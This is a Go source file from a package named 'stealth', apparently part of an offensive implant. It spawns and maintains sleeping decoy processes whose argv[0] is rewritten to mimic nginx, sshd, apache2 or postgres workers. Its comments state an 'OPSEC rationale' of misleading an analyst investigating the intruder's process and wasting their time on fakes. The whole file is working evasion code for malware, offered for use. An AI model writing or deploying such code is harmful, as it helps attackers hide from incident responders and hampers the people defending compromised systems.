package stealth

import (
	"os"
	"os/exec"
	"sync"
	"syscall"
	"time"
)

// Decoy Processes
//
// OPSEC rationale: An analyst investigating our PID sees one suspicious process.
// If we spawn multiple child processes that LOOK like legitimate service workers,
// the analyst has to investigate each one — wasting time on fakes.
// These decoys also make our process tree look like a real service (e.g., nginx
// master with worker children, sshd with session children).

// Decoy represents a running decoy process.
type Decoy struct {
	PID     int
	Name    string
	Process *os.Process
}

// DecoyManager manages decoy process lifecycle.
type DecoyManager struct {
	decoys     []*Decoy
	done       chan struct{}
	mu         sync.Mutex
	spawnFails map[string]int // tracks consecutive spawn failures per name
}

// NewDecoyManager creates a decoy manager.
func NewDecoyManager() *DecoyManager {
	return &DecoyManager{
		done:       make(chan struct{}),
		spawnFails: make(map[string]int),
	}
}

// SpawnServiceDecoys spawns decoy processes matching a service's expected workers.
func (dm *DecoyManager) SpawnServiceDecoys(serviceName string) {
	spawn := func(name string) {
		if err := dm.spawnSleeper(name); err != nil {
			dm.mu.Lock()
			dm.spawnFails[name]++
			dm.mu.Unlock()
		}
	}

	switch serviceName {
	case "nginx":
		// nginx has a master + N workers
		for i := 0; i < 4; i++ {
			spawn("nginx: worker process")
		}
		spawn("nginx: cache manager process")
	case "sshd":
		// sshd has listener + privilege separation children
		spawn("sshd: [accepted]")
		spawn("sshd: [net]")
	case "apache2":
		for i := 0; i < 5; i++ {
			spawn("apache2: idle worker")
		}
	case "postgres":
		spawn("postgres: checkpointer")
		spawn("postgres: background writer")
		spawn("postgres: walwriter")
		spawn("postgres: autovacuum launcher")
		spawn("postgres: stats collector")
	default:
		// Generic: spawn 2 worker-looking processes
		spawn(serviceName + ": worker")
		spawn(serviceName + ": monitor")
	}

	// Maintain decoys — respawn if they die
	go dm.maintainDecoys()
}

// spawnSleeper spawns a process that does nothing but sleep.
// We use /bin/sleep with a very long duration.
// The argv is overwritten to look like a service worker.
func (dm *DecoyManager) spawnSleeper(fakeName string) error {
	// Use sleep as the base process — it uses minimal resources
	cmd := exec.Command("/bin/sleep", "infinity")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true, // own process group
	}

	// Overwrite argv[0] with the fake name
	cmd.Args = []string{fakeName}

	// Redirect all IO to /dev/null
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return err
	}

	dm.mu.Lock()
	dm.decoys = append(dm.decoys, &Decoy{
		PID:     cmd.Process.Pid,
		Name:    fakeName,
		Process: cmd.Process,
	})
	dm.mu.Unlock()
	return nil
}

// maintainDecoys checks decoy health and respawns dead ones.
func (dm *DecoyManager) maintainDecoys() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-dm.done:
			return
		case <-ticker.C:
			dm.mu.Lock()
			var dead []string
			alive := dm.decoys[:0]
			for _, d := range dm.decoys {
				if err := d.Process.Signal(syscall.Signal(0)); err != nil {
					d.Process.Wait()
					dead = append(dead, d.Name)
				} else {
					alive = append(alive, d)
				}
			}
			// Nil out trailing pointers to avoid GC leak from shared backing array
			for i := len(alive); i < len(dm.decoys); i++ {
				dm.decoys[i] = nil
			}
			dm.decoys = alive

			// Collect names to respawn, filtering by retry limit
			var toRespawn []string
			for _, name := range dead {
				if dm.spawnFails[name] < 3 {
					toRespawn = append(toRespawn, name)
				}
			}
			dm.mu.Unlock()

			// Respawn outside the lock
			for _, name := range toRespawn {
				if err := dm.spawnSleeper(name); err != nil {
					dm.mu.Lock()
					dm.spawnFails[name]++
					dm.mu.Unlock()
				}
			}
		}
	}
}

// Stop kills all decoy processes and stops the manager.
func (dm *DecoyManager) Stop() {
	select {
	case <-dm.done:
		return
	default:
		close(dm.done)
	}

	dm.mu.Lock()
	defer dm.mu.Unlock()

	for _, d := range dm.decoys {
		d.Process.Kill()
		d.Process.Wait()
	}
	dm.decoys = nil
}

// Count returns the number of active decoys.
func (dm *DecoyManager) Count() int {
	dm.mu.Lock()
	defer dm.mu.Unlock()
	return len(dm.decoys)
}

// ListDecoys returns info about active decoys.
func (dm *DecoyManager) ListDecoys() []Decoy {
	dm.mu.Lock()
	defer dm.mu.Unlock()

	result := make([]Decoy, len(dm.decoys))
	for i, d := range dm.decoys {
		result[i] = *d
	}
	return result
}
